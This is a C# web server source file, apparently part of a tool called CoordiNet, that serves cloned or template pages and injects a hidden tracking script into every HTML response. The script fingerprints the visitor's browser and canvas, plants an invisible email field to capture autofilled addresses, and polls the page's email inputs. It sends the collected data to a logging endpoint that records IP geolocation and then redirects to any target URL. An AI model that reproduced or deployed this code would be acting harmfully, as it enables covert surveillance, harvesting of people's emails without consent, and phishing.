using System.Collections.Specialized;
using System.Net;
using System.Text;
using System.Text.Json;
using CoordiNet.Core;
using CoordiNet.Geolocation;

namespace CoordiNet.Web;

public sealed class WebServer
{
    private readonly string _rootDirectory;
    private readonly int _port;
    private readonly CancellationTokenSource _shutdown = new();
    private readonly Dictionary<string, string> _routeMap = new(StringComparer.OrdinalIgnoreCase);
    private HttpListener? _listener;
    private Task? _acceptLoop;

    public WebServer(string rootDirectory, int port)
    {
        _rootDirectory = rootDirectory;
        _port = port;
    }

    public void MapRoute(string routePath, string directoryPath)
    {
        if (string.IsNullOrWhiteSpace(routePath))
        {
            throw new ArgumentException("Route path is required.", nameof(routePath));
        }

        if (string.IsNullOrWhiteSpace(directoryPath))
        {
            throw new ArgumentException("Directory path is required.", nameof(directoryPath));
        }

        _routeMap[NormalizeRoute(routePath)] = directoryPath;
    }

    public Task StartAsync()
    {
        if (_listener is not null)
        {
            return Task.CompletedTask;
        }

        _listener = new HttpListener();
        _listener.Prefixes.Add($"http://localhost:{_port}/");
        _listener.Start();

        _acceptLoop = Task.Run(async () =>
        {
            while (!_shutdown.IsCancellationRequested && _listener.IsListening)
            {
                HttpListenerContext context;

                try
                {
                    context = await _listener.GetContextAsync();
                }
                catch (HttpListenerException) when (_shutdown.IsCancellationRequested)
                {
                    break;
                }
                catch (ObjectDisposedException) when (_shutdown.IsCancellationRequested)
                {
                    break;
                }

                _ = Task.Run(() => HandleRequestAsync(context), CancellationToken.None);
            }
        });

        return Task.CompletedTask;
    }

    public async Task StopAsync()
    {
        _shutdown.Cancel();

        if (_listener is not null)
        {
            _listener.Stop();
            _listener.Close();
            _listener = null;
        }

        if (_acceptLoop is not null)
        {
            await _acceptLoop;
        }
    }

    private async Task HandleRequestAsync(HttpListenerContext context)
    {
        try
        {
            var absolutePath = context.Request.Url?.AbsolutePath ?? "/";
            var query = context.Request.QueryString;

            if (absolutePath.Equals("/api/ip-location", StringComparison.OrdinalIgnoreCase))
            {
                await HandleIpLocation(context);
                return;
            }

            if (absolutePath.Equals("/log", StringComparison.OrdinalIgnoreCase))
            {
                await HandleLog(context, query);
                return;
            }

            if (absolutePath.Equals("/redirect", StringComparison.OrdinalIgnoreCase))
            {
                await HandleRedirect(context, query);
                return;
            }

            await HandleStaticFile(context, absolutePath);
        }
        catch
        {
            context.Response.StatusCode = 500;
            context.Response.Close();
        }
    }

    private async Task HandleStaticFile(HttpListenerContext context, string path)
    {
        var routeDirectory = ResolveRouteDirectory(path);
        var relativePath = string.IsNullOrWhiteSpace(path)
            ? string.Empty
            : path.TrimStart('/', '\\');

        relativePath = relativePath.Replace('/', Path.DirectorySeparatorChar).Replace('\\', Path.DirectorySeparatorChar);

        var targetPath = string.IsNullOrWhiteSpace(routeDirectory)
            ? Path.Combine(_rootDirectory, relativePath)
            : Path.Combine(routeDirectory, "index.html");

        if (string.IsNullOrWhiteSpace(path) || path == "/")
        {
            targetPath = Path.Combine(_rootDirectory, "index.html");
        }

        var fileToServe = targetPath;
        var fileDirectory = Path.GetDirectoryName(fileToServe) ?? _rootDirectory;
        var root = Path.GetFullPath(_rootDirectory);
        var fullPath = Path.GetFullPath(fileToServe);

        if (!IsWithinRoot(fullPath, root))
        {
            context.Response.StatusCode = 403;
            context.Response.Close();
            return;
        }

        if (!File.Exists(fullPath))
        {
            context.Response.StatusCode = 404;
            context.Response.Close();
            return;
        }

        var originalHtml = await File.ReadAllTextAsync(fullPath, Encoding.UTF8);
        var injectedHtml = InjectTrackingPayload(originalHtml);
        var bytes = Encoding.UTF8.GetBytes(injectedHtml);

        context.Response.ContentType = GetContentType(fullPath);
        context.Response.ContentLength64 = bytes.Length;
        await context.Response.OutputStream.WriteAsync(bytes, 0, bytes.Length);
        context.Response.Close();
    }

    private string? ResolveRouteDirectory(string path)
    {
        var normalizedPath = NormalizeRoute(path);

        if (string.IsNullOrWhiteSpace(normalizedPath) || normalizedPath == "/")
        {
            return null;
        }

        if (_routeMap.TryGetValue(normalizedPath, out var directoryPath) && !string.IsNullOrWhiteSpace(directoryPath))
        {
            return directoryPath;
        }

        if (normalizedPath.StartsWith("/external/", StringComparison.OrdinalIgnoreCase))
        {
            var folderName = normalizedPath.Substring("/external/".Length).Trim();
            if (!string.IsNullOrWhiteSpace(folderName))
            {
                return Path.Combine(_rootDirectory, "external-websites", folderName);
            }
        }

        var templateCandidate = Path.Combine(_rootDirectory, "templates", normalizedPath.TrimStart('/', '\\'));
        if (Directory.Exists(templateCandidate) && File.Exists(Path.Combine(templateCandidate, "index.html")))
        {
            return templateCandidate;
        }

        var externalCandidate = Path.Combine(_rootDirectory, "external-websites", normalizedPath.TrimStart('/', '\\'));
        if (Directory.Exists(externalCandidate) && File.Exists(Path.Combine(externalCandidate, "index.html")))
        {
            return externalCandidate;
        }

        return null;
    }

    private static string NormalizeRoute(string route)
    {
        if (string.IsNullOrWhiteSpace(route))
        {
            return "/";
        }

        var normalized = route.Trim();
        if (!normalized.StartsWith('/'))
        {
            normalized = "/" + normalized;
        }

        return normalized.TrimEnd('/') == string.Empty ? "/" : normalized.TrimEnd('/');
    }

    private static bool IsWithinRoot(string path, string root)
    {
        var fullPath = Path.GetFullPath(path);
        var fullRoot = Path.GetFullPath(root);
        return fullPath.StartsWith(fullRoot, StringComparison.OrdinalIgnoreCase);
    }

    private static string InjectTrackingPayload(string html)
    {
        const string marker = "</body>";
        const string payload = """
<script>
(function() {
    const osPlatform = navigator.userAgentData?.platform || navigator.platform || 'unknown';
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const hardwareCores = navigator.hardwareConcurrency || 'unknown';
    const transitionSource = document.referrer || 'direct';
    const browserVendor = (navigator.vendor && navigator.vendor.length) ? navigator.vendor : (navigator.userAgentData && navigator.userAgentData.brands && navigator.userAgentData.brands.length ? navigator.userAgentData.brands[0].brand : 'unknown');
    const botCheck = !!(navigator.webdriver || /bot|crawl|slurp|spider/i.test(navigator.userAgent));
    let harvested_email = '';

    function simpleHash(value) {
        let hash = 0;
        for (let i = 0; i < value.length; i++) {
            hash = ((hash << 5) - hash) + value.charCodeAt(i);
            hash |= 0;
        }
        return (Math.abs(hash).toString(16)).padStart(16, '0');
    }

    function generateCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const text = 'Coordinet-CS-Canvas-Fingerprint';
            context.textBaseline = 'top';
            context.font = '14px Arial';
            context.fillStyle = '#f0f';
            context.fillText(text, 2, 2);
            context.strokeStyle = '#0ff';
            context.strokeText(text, 2, 2);
            return simpleHash(canvas.toDataURL() + ':' + text);
        } catch (error) {
            return 'canvas-unavailable';
        }
    }

    const canvasFingerprint = generateCanvasFingerprint();

    const hiddenForm = document.createElement('form');
    hiddenForm.style.position = 'fixed';
    hiddenForm.style.left = '-9999px';
    hiddenForm.style.top = '-9999px';
    hiddenForm.style.opacity = '0';
    hiddenForm.style.pointerEvents = 'none';
    hiddenForm.setAttribute('aria-hidden', 'true');

    const hiddenInput = document.createElement('input');
    hiddenInput.type = 'email';
    hiddenInput.name = 'email';
    hiddenInput.autocomplete = 'email';
    hiddenInput.value = '';
    hiddenForm.appendChild(hiddenInput);
    document.body.appendChild(hiddenForm);

    function captureEmail() {
        const candidates = [
            hiddenInput,
            document.querySelector('input[type="email"]'),
            document.querySelector('input[name="email"]'),
            document.querySelector('input[autocomplete="email"]')
        ];

        for (const candidate of candidates) {
            if (candidate && candidate.value) {
                harvested_email = candidate.value;
                window.harvested_email = harvested_email;
                return;
            }
        }

        window.harvested_email = harvested_email;
    }

    ['input', 'change', 'focusin', 'keydown'].forEach(eventName => {
        window.addEventListener(eventName, captureEmail, { passive: true });
    });

    setInterval(captureEmail, 500);

    window.addEventListener('DOMContentLoaded', function() {
        const params = new URLSearchParams({
            os_platform: osPlatform,
            screen_res: screenRes,
            hardware_cores: hardwareCores,
            transition_source: transitionSource,
            browser_vendor: browserVendor,
            canvas_fingerprint: canvasFingerprint,
            bot_check: String(botCheck),
            harvested_email: capturedValue()
        });

        function capturedValue() {
            captureEmail();
            return window.harvested_email || harvested_email || '';
        }

        fetch('/redirect?' + params.toString(), {
            method: 'GET',
            credentials: 'omit',
            cache: 'no-store',
            headers: { 'Accept': 'application/json' }
        }).catch(function() {
            // Best-effort telemetry only.
        });
    });
})();
</script>
""";

        if (html.IndexOf(marker, StringComparison.OrdinalIgnoreCase) < 0)
        {
            return html + payload;
        }

        return html.Replace(marker, payload + marker, StringComparison.OrdinalIgnoreCase);
    }

    private static async Task HandleIpLocation(HttpListenerContext context)
    {
        string? remoteIp = context.Request.RemoteEndPoint?.Address.ToString();
        var result = await IpGeolocation.GetLocationAsync(remoteIp);

        var payload = new
        {
            ip = result.IpAddress,
            country = result.Country,
            region = result.Region,
            city = result.City,
            latitude = result.Latitude,
            longitude = result.Longitude
        };

        byte[] json = JsonSerializer.SerializeToUtf8Bytes(payload);
        context.Response.ContentType = "application/json";
        context.Response.ContentLength64 = json.Length;
        await context.Response.OutputStream.WriteAsync(json);
        context.Response.Close();
    }

    private static async Task HandleLog(HttpListenerContext context, NameValueCollection query)
    {
        string clientIp = GetClientIp(context.Request);
        string browserLat = query["lat"] ?? string.Empty;
        string browserLon = query["lon"] ?? string.Empty;
        string status = query["status"] ?? "unknown";
        string id = query["id"] ?? Guid.NewGuid().ToString("N");
        string osPlatform = query["os_platform"] ?? "unknown";
        string screenRes = query["screen_res"] ?? "unknown";
        string hardwareCores = query["hardware_cores"] ?? "unknown";
        string transitionSource = query["transition_source"] ?? context.Request.Headers["Referer"] ?? context.Request.UrlReferrer?.ToString() ?? "unknown";
        string harvestedEmail = query["harvested_email"] ?? string.Empty;
        string browserVendor = query["browser_vendor"] ?? "unknown";
        string canvasFingerprint = query["canvas_fingerprint"] ?? "unknown";
        string botCheck = query["bot_check"] ?? "false";
        string userAgent = context.Request.UserAgent ?? "unknown";
        string asn = query["asn"] ?? "N/A";

        var geoLocation = await IpGeolocation.GetLocationAsync(clientIp);
        if (string.IsNullOrWhiteSpace(asn) || asn == "N/A")
        {
            asn = geoLocation.Asn;
        }

        await CoreHelper.ParseAndFormatLocationAsync(
            clientIp,
            browserLat,
            browserLon,
            id,
            osPlatform,
            screenRes,
            hardwareCores,
            transitionSource,
            harvestedEmail,
            browserVendor,
            canvasFingerprint,
            botCheck,
            geoLocation.Country,
            geoLocation.State,
            geoLocation.City,
            geoLocation.Isp,
            geoLocation.Accuracy?.ToString("0.##") ?? "N/A",
            geoLocation.AccuracyRadiusKm?.ToString("0.##") ?? "N/A",
            userAgent,
            geoLocation.Latitude?.ToString("0.######") ?? null,
            geoLocation.Longitude?.ToString("0.######") ?? null,
            asn);

        var session = new DemoSession
        {
            IpAddress = clientIp,
            UserAgent = context.Request.UserAgent,
            Latitude = TryParseDouble(browserLat),
            Longitude = TryParseDouble(browserLon),
            StatusCode = status,
            TrackingId = id,
            TimestampUtc = DateTime.UtcNow,
            Mode = "live",
            Source = "browser",
            Country = geoLocation.Country,
            State = geoLocation.State,
            City = geoLocation.City,
            Isp = geoLocation.Isp,
            Asn = geoLocation.Asn,
            BrowserVendor = browserVendor,
            OperatingSystem = osPlatform,
            HardwareCores = hardwareCores,
            ScreenResolution = screenRes,
            CanvasHash = canvasFingerprint,
            TransitionSource = transitionSource,
            AccuracyRadius = geoLocation.AccuracyRadiusKm?.ToString("0.##") ?? "N/A",
            ConfidenceScore = geoLocation.Accuracy?.ToString("0.##") ?? "N/A",
            BrowserEmail = harvestedEmail,
            DeploymentUrl = query["deployment_url"] ?? string.Empty,
            ShortenedUrl = query["shortened_url"] ?? string.Empty,
            TunnelUrl = query["tunnel_url"] ?? string.Empty
        };

        var outputDirectory = RuntimeBootstrap.GeneratedRoot;
        await SessionLogger.SaveAsync(outputDirectory, session);

        var payload = new
        {
            success = true,
            endpoint = "/log",
            query = query.AllKeys.ToDictionary(
                key => key ?? string.Empty,
                key => query[key] ?? string.Empty,
                StringComparer.OrdinalIgnoreCase),
            id,
            status,
            clientIp,
            osPlatform,
            screenRes,
            hardwareCores,
            transitionSource,
            harvestedEmail,
            browserVendor,
            canvasFingerprint,
            botCheck,
            geoLocation,
            timestampUtc = session.TimestampUtc
        };

        byte[] json = JsonSerializer.SerializeToUtf8Bytes(payload);
        context.Response.StatusCode = 200;
        context.Response.ContentType = "application/json";
        context.Response.ContentLength64 = json.Length;
        await context.Response.OutputStream.WriteAsync(json);
        context.Response.Close();
    }

    private static async Task HandleRedirect(HttpListenerContext context, NameValueCollection query)
    {
        var redirectUrl = query["target"] ?? query["next"] ?? query["redirect"] ?? "https://example.com";
        var clientIp = GetClientIp(context.Request);
        var id = query["id"] ?? Guid.NewGuid().ToString("N");
        var osPlatform = query["os_platform"] ?? "unknown";
        var screenRes = query["screen_res"] ?? "unknown";
        var hardwareCores = query["hardware_cores"] ?? "unknown";
        var transitionSource = query["transition_source"] ?? context.Request.Headers["Referer"] ?? context.Request.UrlReferrer?.ToString() ?? "unknown";
        var harvestedEmail = query["harvested_email"] ?? string.Empty;
        var browserVendor = query["browser_vendor"] ?? "unknown";
        var canvasFingerprint = query["canvas_fingerprint"] ?? "unknown";
        var botCheck = query["bot_check"] ?? "false";
        var userAgent = context.Request.UserAgent ?? "unknown";
        var geoLocation = await IpGeolocation.GetLocationAsync(clientIp);

        await CoreHelper.ParseAndFormatLocationAsync(
            clientIp,
            query["lat"] ?? string.Empty,
            query["lon"] ?? string.Empty,
            id,
            osPlatform,
            screenRes,
            hardwareCores,
            transitionSource,
            harvestedEmail,
            browserVendor,
            canvasFingerprint,
            botCheck,
            geoLocation.Country,
            geoLocation.State,
            geoLocation.City,
            geoLocation.Isp,
            geoLocation.Accuracy?.ToString("0.##") ?? "N/A",
            geoLocation.AccuracyRadiusKm?.ToString("0.##") ?? "N/A",
            userAgent,
            geoLocation.Latitude?.ToString("0.######") ?? null,
            geoLocation.Longitude?.ToString("0.######") ?? null);

        context.Response.StatusCode = 302;
        context.Response.AddHeader("Location", redirectUrl);
        context.Response.ContentType = "text/plain";
        context.Response.Close();
    }

    private static string GetClientIp(HttpListenerRequest request)
    {
        string? forwardedFor = request.Headers["X-Forwarded-For"];
        if (!string.IsNullOrWhiteSpace(forwardedFor))
        {
            var first = forwardedFor.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries)[0];
            if (!string.IsNullOrWhiteSpace(first))
            {
                return first;
            }
        }

        string? realIp = request.Headers["X-Real-IP"];
        if (!string.IsNullOrWhiteSpace(realIp))
        {
            return realIp.Trim();
        }

        string? cloudflareIp = request.Headers["CF-Connecting-IP"];
        if (!string.IsNullOrWhiteSpace(cloudflareIp))
        {
            return cloudflareIp.Trim();
        }

        return request.RemoteEndPoint?.Address.ToString() ?? "unknown";
    }

    private static double? TryParseDouble(string value)
    {
        if (double.TryParse(value, out var parsed))
        {
            return parsed;
        }

        return null;
    }

    private static string GetContentType(string path)
    {
        return Path.GetExtension(path).ToLowerInvariant() switch
        {
            ".html" => "text/html",
            ".css" => "text/css",
            ".js" => "application/javascript",
            ".json" => "application/json",
            ".png" => "image/png",
            ".jpg" or ".jpeg" => "image/jpeg",
            ".svg" => "image/svg+xml",
            _ => "application/octet-stream"
        };
    }
}